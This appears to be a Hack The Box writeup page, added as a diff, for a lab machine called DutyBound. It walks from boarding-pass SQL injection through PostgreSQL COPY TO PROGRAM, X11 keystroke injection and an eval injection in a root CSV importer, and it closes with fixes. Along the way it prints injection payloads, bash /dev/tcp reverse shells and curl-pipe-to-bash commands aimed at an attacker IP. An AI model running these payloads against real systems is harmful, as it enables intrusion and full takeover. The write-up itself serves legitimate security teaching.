@@ -1,0 +1,343 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>DutyBound — HTB Writeup (Lanky)</title>
+  <meta name="description" content="Hack The Box DutyBound full writeup: boarding-pass SQL injection, PostgreSQL command execution, X11 kiosk pivot, and root duty-rate importer injection.">
+  <link rel="stylesheet" href="../assets/style.css?v=10">
+  <link rel="icon" type="image/png" sizes="32x32" href="../assets/favicon-32.png">
+</head>
+<body>
+  <header class="nav">
+    <div class="wrap">
+      <a class="brand" href="../index.html">lanky<span class="accent">.pwns</span></a>
+      <a class="link" href="../index.html#lab">← all writeups</a>
+    </div>
+  </header>
+  <article class="wrap">
+    <a class="back" href="../index.html#lab">back to writeups</a>
+    <svg class="wu-logo" viewBox="0 0 64 64" role="img" aria-label="DutyBound boarding pass icon"><rect width="64" height="64" rx="8" fill="#11141b"/><rect x="10" y="17" width="44" height="30" rx="4" fill="none" stroke="#a3e635" stroke-width="3"/><path d="M18 26h18M18 32h12M18 38h18M43 23v18" stroke="#a3e635" stroke-width="2.5"/><circle cx="48" cy="32" r="3" fill="#a3e635"/></svg>
+    <h1 style="margin-top:16px;">DutyBound</h1>
+    <div class="subtitle">Hack The Box · <a href="https://app.hackthebox.com/machines/DutyBound" target="_blank" rel="noopener">app.hackthebox.com/machines/DutyBound</a> · Season 12 · solved 25 October 2026 ACDT</div>
+    <div class="machine-meta">
+      <span class="pill os-linux">Linux</span>
+      <span class="pill diff-medium">Medium</span>
+      <span class="pill season">Season 12</span>
+      <span class="pill rankp">Machine rank #251</span>
+      <span class="pill">BCBP</span>
+      <span class="pill">SQL injection</span>
+      <span class="pill">X11</span>
+      <span class="pill">Shell eval</span>
+      <span class="pill flagp">User</span>
+      <span class="pill flagp">Root</span>
+      <span class="pill rooted">● Completed</span>
+    </div>
+    <div class="callout">
+      <span class="tag">TL;DR</span>
+      A valid boarding pass carried SQL injection into the sales audit. The database role's
+      <code>pg_execute_server_program</code> grant provided a <code>postgres</code> shell. X11 input
+      reached the logged-in kiosk user, whose group-writable duty-rate CSV was evaluated by a root service.
+    </div>
+    <dl class="fact">
+      <dt>Target</dt><dd><code>10.129.19.28</code> · <code>airsnacks.htb</code></dd>
+      <dt>Entry</dt><dd><code>POST /checkout/boarding-pass/verify</code></dd>
+      <dt>Foothold</dt><dd>Audit SQL injection → PostgreSQL <code>COPY TO PROGRAM</code></dd>
+      <dt>User</dt><dd>XTEST input to Openbox <code>xterm</code> → <code>dutyfree-kiosk</code></dd>
+      <dt>Root</dt><dd>Writable rate CSV → systemd path unit → unsafe <code>eval</code></dd>
+    </dl>
+<h2><span class="num">01</span>External reconnaissance</h2>
+<p>The full TCP scan found only three open ports:</p>
+<pre data-lang="text"><code>22/tcp   open  ssh    OpenSSH 8.9p1 Ubuntu
+80/tcp   open  http   nginx
+443/tcp  open  https  nginx/1.18.0
+</code></pre>
+<pre data-lang="bash"><code>nmap -Pn -n -p- --min-rate 1000 -T4 10.129.19.28
+echo '10.129.19.28 airsnacks.htb' | sudo tee -a /etc/hosts
+</code></pre>
+<p>HTTP redirected to HTTPS. The TLS name and website pointed to <code>airsnacks.htb</code>, an AirSnacks self-service checkout. The landing page led to <code>/browse</code>, where selecting a product posted its SKU to <code>/cart/add</code>. The basket then linked to <code>/checkout/boarding-pass</code>. A broad path search mainly returned the routes already visible in the application: <code>/browse</code>, <code>/cart</code>, <code>/exit</code>, and <code>/health</code>. A full TCP scan and virtual-host guesses gave no second service or distinct site.</p>
+<p>The JavaScript in <code>/static/app.js</code> exposed the scanner request:</p>
+<pre data-lang="javascript"><code>postJSON(&quot;/checkout/boarding-pass/verify&quot;, { raw: &quot;&quot; });
+</code></pre>
+<p>The on-screen scanner always reported “No barcode detected”, but the request was still sent. This meant I could supply <code>raw</code> directly. I first created a basket item so the checkout flow had a cart:</p>
+<pre data-lang="bash"><code>JAR=/tmp/dutybound-cookies.txt
+curl -ks -c &quot;$JAR&quot; -b &quot;$JAR&quot; \
+  -H 'Content-Type: application/json' \
+  -d '{&quot;sku&quot;:&quot;SNK-CRN&quot;}' \
+  https://airsnacks.htb/cart/add
+</code></pre>
+<p>An empty scan returned <code>BCBP_ERR_FORMAT_CODE</code> with <code>expected 'M' at offset 0</code>. The checkout page also said the boarding-pass details were written to a sales audit log for customs and VAT. That made the pass parser and audit write the strongest lead.</p>
+<h2><span class="num">02</span>Building a boarding pass the server accepted</h2>
+<p>The endpoint parsed a Bar Coded Boarding Pass (BCBP) rather than an arbitrary barcode string. Its first 58 characters contained the fixed data for one flight leg. A two-character hexadecimal length then described the conditional data that followed. Error messages gave precise validation checkpoints:</p>
+<table>
+<thead>
+<tr>
+<th>Input change</th>
+<th>Server response</th>
+<th>Correction</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Empty <code>raw</code></td>
+<td><code>BCBP_ERR_FORMAT_CODE</code></td>
+<td>Start with <code>M</code></td>
+</tr>
+<tr>
+<td>Seat <code>12A</code></td>
+<td><code>BCBP_ERR_SEAT_FORMAT</code></td>
+<td>Use <code>012A</code> (<code>NNNA</code>)</td>
+</tr>
+<tr>
+<td>Sequence <code>00001</code></td>
+<td><code>BCBP_ERR_SEQUENCE_FORMAT</code></td>
+<td>Use <code>0001A</code> (four digits and a letter)</td>
+</tr>
+<tr>
+<td>Conditional length <code>00</code></td>
+<td><code>BCBP_ERR_CONDITIONAL_REQUIRED</code></td>
+<td>Add the conditional section</td>
+</tr>
+<tr>
+<td>Minimal conditional section</td>
+<td><code>BCBP_ERR_ITEM10_MISMATCH</code></td>
+<td>Use an accepted item 10 value; <code>0B</code> worked</td>
+</tr>
+<tr>
+<td>Missing leg-specific value</td>
+<td><code>BCBP_ERR_ITEM17_MISMATCH</code></td>
+<td>Use an accepted item 17 value; <code>03</code> worked</td>
+</tr>
+</tbody>
+</table>
+<p>This one-leg payload passed the checks:</p>
+<pre data-lang="bash"><code>RAW=$(printf 'M1%-20sE%-7s%-3s%-3s%-3s%-5s%03d%-1s%-4s%-5s%-1s14&gt;70B0WW6298BBA 03125' \
+  'TEST/USER' 'ABC123' 'LHR' 'JFK' 'BA' '0123' 298 'Y' '012A' '0001A' '1')
+
+printf 'Length: %s\n' &quot;${#RAW}&quot;  # 80
+curl -ks -c &quot;$JAR&quot; -b &quot;$JAR&quot; \
+  -H 'Content-Type: application/json' \
+  -d &quot;{\&quot;raw\&quot;:\&quot;$RAW\&quot;}&quot; \
+  https://airsnacks.htb/checkout/boarding-pass/verify
+</code></pre>
+<p>The response was HTTP 200 with an <code>audit_ref</code>, destination <code>JFK</code>, and a signed <code>eligibility_token</code>. For the <code>LHR</code> origin it classified the sale as <code>OFF_AIRPORT</code> and <code>exempt:false</code>. The token was a result of successful parsing, not the exploit primitive.</p>
+<p>After SQL enumeration disclosed the store name <code>AirSnacks — HTB International T2</code>, I changed the origin to <code>HTB</code>. With <code>HTB</code> to <code>JFK</code>, the response became <code>regime: INTERNATIONAL</code> and <code>exempt:true</code>, and the basket reflected a £13.30 tax-free saving. The payment page still showed a static “Payment unavailable” message and directed customers to a staff-operated till. That route did not provide the foothold.</p>
+<h2><span class="num">03</span>SQL injection in airline-use data</h2>
+<p>The conditional section could contain additional airline-use data after the validated <code>03125</code> prefix. Its total length had to match the two-character hexadecimal length. I used this small helper to make each attempt consistent:</p>
+<pre data-lang="python"><code>#!/usr/bin/env python3
+import sys
+import requests
+
+BASE = &quot;https://airsnacks.htb&quot;
+
+def boarding_pass(airline_use: str, origin: str = &quot;LHR&quot;) -&gt; str:
+    fixed = (
+        f&quot;M1{'TEST/USER':&lt;20}E{'ABC123':&lt;7}&quot;
+        f&quot;{origin:&lt;3}{'JFK':&lt;3}{'BA':&lt;3}{'0123':&lt;5}&quot;
+        f&quot;298Y{'012A':&lt;4}{'0001A':&lt;5}1&quot;
+    )
+    conditional = &quot;&gt;70B0WW6298BBA 03125&quot; + airline_use
+    assert len(fixed) == 58
+    assert len(conditional) &lt;= 255
+    return fixed + f&quot;{len(conditional):02X}&quot; + conditional
+
+session = requests.Session()
+session.verify = False
+requests.packages.urllib3.disable_warnings()
+session.post(BASE + &quot;/cart/add&quot;, json={&quot;sku&quot;: &quot;SNK-CRN&quot;})
+response = session.post(
+    BASE + &quot;/checkout/boarding-pass/verify&quot;,
+    json={&quot;raw&quot;: boarding_pass(sys.argv[1])},
+)
+print(response.status_code, response.text)
+</code></pre>
+<p>Save it as <code>bcbp.py</code> and run <code>python3 bcbp.py '&lt;airline-use-data&gt;'</code>. A lone quote produced a PostgreSQL error wrapped as <code>DCS_ERR_INTERNAL</code>, including an “unterminated quoted string” detail. That established that the airline-use value was being inserted into SQL as a string literal.</p>
+<p>I then used an error-based expression to inspect the database identity:</p>
+<pre data-lang="bash"><code>python3 bcbp.py &quot;'||(SELECT current_user)::int||'&quot;
+</code></pre>
+<p>The integer cast failed on the text value <code>airsnacks_app</code>. The same pattern let me query <code>information_schema</code> and the application tables. The public schema contained <code>airport</code>, <code>duty_rate</code>, <code>airline_ref</code>, <code>interline_partner</code>, <code>catalog_item</code>, <code>store_config</code>, and <code>bp_scan_audit</code>. An audit row had kiosk ID <code>dutyfree-kiosk7</code>. The <code>store_config</code> row identified the store as <code>AirSnacks — HTB International T2</code>.</p>
+<p>For example, these two expressions could be dropped into the same <code>'||(SELECT ... )::int||'</code> wrapper to make PostgreSQL return a table list or the kiosk ID in its cast error:</p>
+<pre data-lang="sql"><code>SELECT string_agg(table_name, ',')
+FROM information_schema.tables
+WHERE table_schema = 'public';
+
+SELECT kiosk_id FROM bp_scan_audit LIMIT 1;
+</code></pre>
+<p>The decisive database check was:</p>
+<pre data-lang="sql"><code>SELECT pg_has_role(current_user, 'pg_execute_server_program', 'MEMBER')::text;
+</code></pre>
+<p>It returned <code>true</code>. The role was not a superuser and did not hold the server-file read or write roles, but <code>pg_execute_server_program</code> was enough for <code>COPY ... TO PROGRAM</code>. A stacked-statement probe, <code>'); SELECT 1;--</code>, also succeeded. From there the injection could execute a shell command on the database server:</p>
+<pre data-lang="bash"><code>python3 bcbp.py \
+  &quot;'); COPY (SELECT 'x') TO PROGRAM 'curl -fsS http://10.10.15.44:8000/sql';--&quot;
+</code></pre>
+<p>My Kali HTTP listener received <code>GET /sql</code> from the target. The endpoint returned HTTP 500 because the listener replied 404 and <code>curl -f</code> exited with status 22. The callback, rather than the HTTP status, confirmed command execution.</p>
+<p>For a shell, I served this script from Kali:</p>
+<pre data-lang="bash"><code>cat &gt; /home/lanky/rev.sh &lt;&lt;'EOF'
+#!/bin/bash
+bash -i &gt;&amp; /dev/tcp/10.10.15.44/4444 0&gt;&amp;1
+EOF
+
+python3 -m http.server 8000 --directory /home/lanky --bind 10.10.15.44
+# In another terminal: nc -lvnp 4444
+</code></pre>
+<pre data-lang="bash"><code>python3 bcbp.py \
+  &quot;'); COPY (SELECT 'x') TO PROGRAM 'curl -s http://10.10.15.44:8000/rev.sh | bash &gt;/dev/null 2&gt;&amp;1 &amp;';--&quot;
+</code></pre>
+<p>The reverse shell ran as the operating-system account <code>postgres</code> (UID 114). PostgreSQL runs <code>COPY TO PROGRAM</code> on the server as its own OS user; the application was not directly executing the command.</p>
+<p>Once on the host, <code>/opt/vrs/airsnacksdf/dcs_bridge/audit.py</code> showed the cause. <code>record_export_evidence</code> built an <code>INSERT INTO bp_scan_audit</code> query with Python <code>%</code> interpolation and placed <code>bp.airline_use</code> inside the final quoted SQL value before calling <code>cur.execute(sql)</code>. The relevant ending was:</p>
+<pre data-lang="python"><code>&quot;... %d, '%s')&quot; % (
+    # Other boarding-pass fields omitted here.
+    len(raw), bp.airline_use
+)
+cur.execute(sql)
+</code></pre>
+<p>The parser checked the mandatory boarding-pass fields, but the trailing airline-use field remained attacker-controlled when the audit query was constructed. Parameterized SQL would have prevented the quote and stacked statement from changing the query structure.</p>
+<h2><span class="num">04</span>From <code>postgres</code> to the kiosk user</h2>
+<p>The <code>postgres</code> shell could not read the user’s home directory. Process enumeration revealed that <code>dutyfree-kiosk</code> was already logged into an Openbox desktop on X display <code>:0</code>, running Firefox in kiosk mode against <code>https://airsnacks.htb</code>. The X server was accessible from the <code>postgres</code> context:</p>
+<pre data-lang="bash"><code>ps -u dutyfree-kiosk -f
+DISPLAY=:0 xset q
+</code></pre>
+<p>The system Openbox configuration at <code>/etc/xdg/openbox/rc.xml</code> bound <strong>Ctrl+Alt+T</strong> to <code>xterm</code>. <code>xdotool</code> was absent, but Python Xlib and its XTEST extension were installed. Sending the shortcut through XTEST opened an <code>xterm</code> owned by <code>dutyfree-kiosk</code>:</p>
+<pre data-lang="python"><code>from Xlib import X, XK, display
+from Xlib.ext import xtest
+import time
+
+d = display.Display(&quot;:0&quot;)
+
+def key(name, down):
+    code = d.keysym_to_keycode(XK.string_to_keysym(name))
+    xtest.fake_input(d, X.KeyPress if down else X.KeyRelease, code)
+
+key(&quot;Control_L&quot;, True)
+key(&quot;Alt_L&quot;, True)
+key(&quot;t&quot;, True)
+key(&quot;t&quot;, False)
+key(&quot;Alt_L&quot;, False)
+key(&quot;Control_L&quot;, False)
+d.sync()
+time.sleep(1)
+</code></pre>
+<p>I confirmed the new window and process belonged to <code>dutyfree-kiosk</code>. Then I typed a command into that terminal through XTEST. This is the same Xlib mechanism, with a few punctuation names mapped explicitly:</p>
+<pre data-lang="python"><code>from Xlib import X, XK, display
+from Xlib.ext import xtest
+import time
+
+d = display.Display(&quot;:0&quot;)
+names = {&quot; &quot;: &quot;space&quot;, &quot;:&quot;: &quot;colon&quot;, &quot;/&quot;: &quot;slash&quot;,
+         &quot;.&quot;: &quot;period&quot;, &quot;|&quot;: &quot;bar&quot;}
+
+def tap(char):
+    sym = XK.string_to_keysym(names.get(char, char))
+    code = d.keysym_to_keycode(sym)
+    if not code:
+        raise ValueError(f&quot;No keycode for {char!r}&quot;)
+    shifted = d.keycode_to_keysym(code, 0) != sym
+    shift = d.keysym_to_keycode(XK.string_to_keysym(&quot;Shift_L&quot;))
+    if shifted:
+        xtest.fake_input(d, X.KeyPress, shift)
+    xtest.fake_input(d, X.KeyPress, code)
+    xtest.fake_input(d, X.KeyRelease, code)
+    if shifted:
+        xtest.fake_input(d, X.KeyRelease, shift)
+    d.sync()
+    time.sleep(0.03)
+
+for char in &quot;curl http://10.10.15.44:8000/user.sh|bash&quot;:
+    tap(char)
+tap(&quot;Return&quot;)
+</code></pre>
+<p>On Kali, <code>user.sh</code> contained a Bash reverse shell to port 4445, and <code>nc -lvnp 4445</code> was listening. The resulting connection identified as <code>dutyfree-kiosk</code>. It could read <code>/home/dutyfree-kiosk/user.txt</code>:</p>
+<pre data-lang="text"><code>588f9224e4baf9b9ecbbbf643e906c46
+</code></pre>
+<p>The trust boundary here was the live graphical session. A lower-privileged service account that could use the X display could send keystrokes to a terminal in another user’s session.</p>
+<h2><span class="num">05</span>A writable root input file</h2>
+<p>The kiosk account belonged to <code>pos-ops</code>. Searching for files writable by that group found a duty-rate CSV:</p>
+<pre data-lang="bash"><code>id
+find /etc /opt /usr/local /var -group pos-ops -ls 2&gt;/dev/null
+ls -ld /opt/vrs/data
+ls -l /opt/vrs/data/duty-rates.csv
+systemctl is-active vrs-duty-apply.path
+</code></pre>
+<pre data-lang="text"><code>drwxrwxr-x root pos-ops /opt/vrs/data
+-rw-rw-r-- root pos-ops /opt/vrs/data/duty-rates.csv
+</code></pre>
+<p>The rates file contained ordinary rows such as:</p>
+<pre data-lang="csv"><code>SPIRITS,45,20
+WINE,25,20
+BEER,25,20
+SOFT_DRINKS,20,20
+SNACKS,20,20
+CONFECTIONERY,20,20
+WATER,0,0
+</code></pre>
+<p>An active systemd path unit, <code>/etc/systemd/system/vrs-duty-apply.path</code>, watched <code>PathModified=/opt/vrs/data/duty-rates.csv</code> and triggered <code>vrs-duty-apply.service</code>. The service ran <code>/opt/vrs/bin/apply-duty-rates.sh</code> as root. The script validated only the second and third CSV fields as digits. It then evaluated the first field as shell code:</p>
+<pre data-lang="bash"><code>while IFS=, read -r tax_class duty_pct vat_pct; do
+  if ! [[ &quot;$duty_pct&quot; =~ ^[0-9]+$ &amp;&amp; &quot;$vat_pct&quot; =~ ^[0-9]+$ ]]; then
+    continue
+  fi
+  eval &quot;${tax_class}=${duty_pct}&quot;
+done &lt; &quot;$RATES&quot;
+</code></pre>
+<p>It later checked required tax-class variables and loaded the CSV into PostgreSQL. By preserving the original rows below a malicious first row, I let the required-variable check pass after the command had already run. The input did not need to be valid CSV for the later database load; execution occurred first.</p>
+<h2><span class="num">06</span>Root through the rate import</h2>
+<p>From the <code>dutyfree-kiosk</code> shell, I saved a backup of the clean CSV:</p>
+<pre data-lang="bash"><code>cp /opt/vrs/data/duty-rates.csv /tmp/duty-rates.csv.orig
+</code></pre>
+<p>On Kali, I staged the root callback and listened on port 4446. The HTTP server from the SQL injection stage was still serving <code>/home/lanky</code>:</p>
+<pre data-lang="bash"><code>cat &gt; /home/lanky/root.sh &lt;&lt;'EOF'
+#!/bin/bash
+bash -i &gt;&amp; /dev/tcp/10.10.15.44/4446 0&gt;&amp;1
+EOF
+
+# In a separate Kali terminal:
+nc -lvnp 4446
+</code></pre>
+<p>From the <code>dutyfree-kiosk</code> shell, I built the replacement file and wrote it over the watched CSV:</p>
+<pre data-lang="bash"><code>printf '%s\n' \
+  'true;curl -s http://10.10.15.44:8000/root.sh|bash;#,1,1' \
+  &gt; /tmp/duty-rates.csv.new
+cat /tmp/duty-rates.csv.orig &gt;&gt; /tmp/duty-rates.csv.new
+cat /tmp/duty-rates.csv.new &gt; /opt/vrs/data/duty-rates.csv
+</code></pre>
+<p>With <code>IFS=,</code>, the first row sets <code>tax_class</code> to <code>true;curl -s http://10.10.15.44:8000/root.sh|bash;#</code>, while <code>duty_pct</code> and <code>vat_pct</code> are both <code>1</code> and pass the numeric regexes. The <code>eval</code> statement becomes:</p>
+<pre data-lang="bash"><code>true;curl -s http://10.10.15.44:8000/root.sh|bash;#=1
+</code></pre>
+<p>The semicolons end the benign <code>true</code> command, the pipe executes the callback script, and <code>#</code> comments out the appended <code>=1</code>. The path unit detected the CSV write and ran the script as root. My first version backgrounded the pipeline and failed to keep a root connection; the foreground form above worked. The listener received a root shell and <code>/root/root.txt</code> contained:</p>
+<pre data-lang="text"><code>769e87447b7bb5b0f356b14397a01aea
+</code></pre>
+<h2><span class="num">07</span>Cleanup and attack path</h2>
+<p>I restored the original CSV and confirmed it matched the backup:</p>
+<pre data-lang="bash"><code>cat /tmp/duty-rates.csv.orig &gt; /opt/vrs/data/duty-rates.csv
+cmp /tmp/duty-rates.csv.orig /opt/vrs/data/duty-rates.csv
+</code></pre>
+<p>The first in-flight service invocation had failed after the malicious row. Writing the clean file again retriggered the path unit; <code>systemctl status vrs-duty-apply.service --no-pager -l</code> then showed <code>status=0/SUCCESS</code>. I closed the extra <code>xterm</code>, reverse shells, and Kali HTTP listener.</p>
+<pre data-lang="text"><code>AirSnacks scanner endpoint
+        ↓ valid BCBP with attacker-controlled airline-use data
+SQL injection in bp_scan_audit INSERT
+        ↓ stacked COPY TO PROGRAM
+postgres shell
+        ↓ X11 XTEST input into live Openbox session
+dutyfree-kiosk shell → user.txt
+        ↓ pos-ops writable CSV + root systemd path service
+unsafe eval in apply-duty-rates.sh
+        ↓
+root shell → root.txt
+</code></pre>
+<h2><span class="num">08</span>What I would fix</h2>
+<ol>
+<li><strong>Parameterize the audit insert.</strong> Pass every boarding-pass field as a bound value. Treat airline-use data as untrusted even after the mandatory BCBP fields pass validation.</li>
+<li><strong>Remove <code>pg_execute_server_program</code> from the application role.</strong> The checkout role should only have the table privileges it needs. PostgreSQL documents <code>COPY TO PROGRAM</code> as server-side command execution under the database OS account.</li>
+<li><strong>Isolate the kiosk display.</strong> A database service account should not be able to connect to the kiosk user's X server or synthesize input in that session. Replace the legacy shared X11 setup or enforce display authorization and process separation.</li>
+<li><strong>Remove <code>eval</code> from the rate importer.</strong> Validate <code>tax_class</code> against an explicit allowlist and store values as data. Do not let a group-writable file become shell syntax in a root service.</li>
+<li><strong>Reduce service privileges.</strong> The rate import should run with the minimum database and filesystem access needed. A rate-file edit should not lead to root command execution.</li>
+</ol>
+<h2>References</h2>
+<ul>
+<li><a href="https://www.iata.org/contentassets/1dccc9ed041b4f3bbdcf8ee8682e75c4/2021_03_02-bcbp-implementation-guide-version-7-.pdf">IATA BCBP Implementation Guide, version 7</a></li>
+<li><a href="https://www.postgresql.org/docs/current/sql-copy.html">PostgreSQL <code>COPY</code> documentation</a></li>
+</ul>
+    <p style="margin-top:40px;"><a class="back" href="../index.html#lab">back to writeups</a></p>
+  </article>
+  <footer><div class="wrap">DutyBound · completed · notes by Luke &nbsp;·&nbsp; <a href="../index.html#lab">all writeups</a></div></footer>
+</body>
+</html>
